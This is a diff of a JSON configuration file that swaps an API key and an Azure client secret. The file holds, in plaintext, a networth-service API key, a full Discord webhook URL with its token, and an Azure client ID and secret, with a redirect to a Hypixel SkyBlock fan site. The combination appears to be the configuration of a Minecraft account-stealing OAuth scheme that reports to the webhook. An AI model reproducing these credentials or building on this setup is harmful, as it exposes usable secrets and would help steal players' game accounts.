@@ -1,23 +1,20 @@
 {
     "networth": {
-        "apiKey": "7187744b-8447-46d2-ab58-0744b8be2896"
+        "apiKey": "Ff388a8a-457a-4be6-ba2e-50f3006d0a36"
     },
-
     "URLS": {
+        "redirect_uri": "",
         "apiURL": ""
     },
-
     "webhook": {
         "webhookURL": "https://discord.com/api/webhooks/1081948657336733776/kX1ejy93eoMwP-DMfAbQA6gADoYfGvKayCWG-wW-Zh9ZHyHyHf5uWi3npyTFtcKYeDY2"
     },
-
     "discord": {
         "bot_token": ""
     },
-
     "azure" : {
         "client_id": "cf73d00a-3b6e-4abb-862f-286dd90f2f0a",
-        "client_secret": "zxF8Q~oAKwogMD1n-ACF7sDRdmUYhmZouecTpduW",
+        "client_secret": "uM-8Q~wSDOU7NoD~WVfrDtEbc3No_zZ0Ww5dKcsu",
         "redirect_uri": "https://hypixelskyblockfans.onrender.com"
     }
 }
